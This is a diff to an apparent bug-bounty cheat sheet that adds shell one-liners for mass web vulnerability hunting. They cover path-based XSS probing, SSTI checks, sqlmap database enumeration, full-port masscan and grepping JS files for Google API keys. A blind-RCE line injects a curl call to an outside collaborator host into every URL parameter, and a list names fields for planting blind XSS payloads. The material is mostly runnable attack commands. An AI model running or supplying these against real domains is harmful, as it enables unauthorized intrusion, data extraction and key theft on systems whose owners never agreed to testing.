@@ -325,3 +325,69 @@ GET /?q=xss	 &nbsp;&nbsp;&nbsp;    POST /q=xss
 ```
 cat domains.txt | while read url; do dom=$(assetfinder --subs-only $url|tee $url.txt;crobat -s $url|tee -a $url.txt|subfinder -d $url -silent|tee -a $url.txt |cat $url.txt|httprobe|sort -u > final-$url.txt);echo -e "\e[1;33m[-]Working with $url""\e[1;32m\n  -> done File saved. Please check :)""\n";done
 ```
+
+## Check all methods on domainlist for Information Disclosure
+```
+cat domains.txt | httprobe | while read url;do ww=$(for i in "GET" "PUT" "HEAD" "POST" "TRACE" "CONNECT" "OPTIONS";do curl -s -L -I -X $i $url;done|grep HTTP|grep -v '301 '|awk '{ printf "%3d: %s\n", NR, $0 }');echo -e "\e[1;32m$url\e[0m""\n""$ww""\n";done
+```
+
+## Path based xss with different type methods.
+1. Inject payload in every path and check xss 
+2. append fake paramters in every path and check xss vulnerability
+3. made poc for you in your terminal
+
+```
+cat domains.txt|gau|egrep -v '(.js|.css|.svg|.jpeg|.jpg)'|grep -v '='|while read url; do dir=$(curl -s -L "$url/xss\"><"|egrep -o '(xss"|xss\\")') dir2=$(curl -s -L "$url/?xss\"><"|egrep -o '(xss"|xss\\")') ;echo -e "Target:\e[1;33m $url\e[0m""\n" "\e[1;32m Method1 -> $dir\e[0m [POC: $url/test\"><]""\n""\e[1;32m  Method2 -> $dir2\e[0m [POC: $url/?test\"><]";done | egrep '(Target|xss)'
+```
+
+## Find Blind RCE with automation
+```
+cat domains.txt|assetfinder --subs-only|httprobe|gau|grep -Ev (.js|.png|.svg|.jpeg)|grep '='|qsreplace -a ' ||curl //burp-collaborator.burpcollaborator.net'|while read url; do rce=$(curl -s $url);echo -e "[RCE-test] $url";done
+```
+If you get Response of your burp collab! Boom RCE
+
+## Scan open ports of domain list using masscan
+```
+cat domains.txt | httpx -ip -silent| awk '{print $2}' | sed -e 's/\[//g' -e 's/\]//g' | tee ips.txt | while read url; do mass=$(sudo masscan --ports 0-65535 $url);echo -e "$url \n $mass";done
+```
+
+## Easy way to find Path based XSS
+```
+cat domains.txt | gau | egrep -v '(=|.png|.svg|.jpg|.jpeg|.gif|.js|.js|.css)' | while read url; do dir=$(curl -s -L "$url/xss\"><"|grep 'xss"');echo -e "Target:\e[1;33m $url/\"><\e[0m""\n" "\e[1;32m$dir\e[0m";done
+```
+
+## Where to look for Blind XSS
+1. Review Forms
+2. Contact Us pages
+3. Password Field (you never know if the other side doesn't properly handle input and if your password is in view mode)
+4. Address fields of e-commerce sites.
+5. First or last name field while doing credit card payments
+6. Set User-Agent to Blind XSS payload. You can do that easily from a proxy such as Burpsuite. And there are many more cases, but we would encourage you to read some reports to get a perfect knowledge, where other hackers are already applying these techniques and how you can use them in your program
+
+
+## Find Google map API keys in JS files & endpoints from Domains & Subdomains.
+```
+cat urls.txt | assetfinder|gau|egrep -v'(.png|.svg|.gif|.jpg|.jpeg|.txt|.ico|.css|\?|.pdf)'|while read url; do map=$(curl -s $url|grep 'AIza');echo -e "$url -> $map";done
+```
+
+## Find P1 Bug in a minute
+#### For Checking SSTI Vulnerability..
+```
+cat urls.txt |gau -subs|grep '='| egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)'|qsreplace "ssti{{7*7}}" | while read url;do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur";done
+```
+
+Output:
+https://example.com/?s=ssti{{7*7}} -> ssti49 --> Means Vulnerable
+
+
+## Check sqli Vulnerability in One shot of domains & subdomains
+```
+cat urls.txt | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt)' | gf sqli|urlive|tee sqli.txt && sqlmap -m sqli.txt --dbs --batch
+```
+
+## Find xmlrpc in single shot on domain & subdomains.
+```
+cat domains.txt | assetfinder --subs-only | httprobe| while read url; do xml=$(curl -s -L $url/xmlrpc.php|grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' |sort -u
+```
+Output:
+https://example.com -> XML-RPC server accepts POST requests only
